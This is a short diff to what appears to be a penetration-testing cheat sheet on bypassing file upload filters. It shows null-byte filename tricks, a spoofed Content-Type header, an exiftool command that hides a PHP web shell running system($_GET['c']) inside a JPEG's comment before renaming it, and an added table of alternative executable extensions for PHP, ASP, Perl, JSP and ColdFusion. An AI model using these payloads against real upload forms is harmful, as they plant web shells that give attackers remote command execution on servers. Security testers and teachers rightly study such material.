@@ -10,7 +10,7 @@ image.php%00.png
 image.php\x00.png
 ```
 
-#### Content-Type Bypass
+#### MIME Type Bypass
 ```
 Content-Type: image/jpeg
 ```
@@ -26,6 +26,16 @@ Content-Type: image/jpeg
 exiftool -Comment='<?php echo "<pre>"; system($_GET['c']);?>' image.jpg
 mv image.jpg image.php.jpg
 ```
+#### Extension Bypass
+
+| Type        | Extension       |
+| ------------- |---------------|
+| **php**      | phtml, .php, .php3, .php4, .php5, and .inc |
+| **asp**      | asp, .aspx      |
+| **perl** | .pl, .pm, .cgi, .lib      |
+| **jsp**      | .jsp, .jspx, .jsw, .jsv, and .jspf      |
+| **Coldfusion**      | .cfm, .cfml, .cfc, .dbm      |
+
 
 ### Chain With Other Vulnerabilities
 
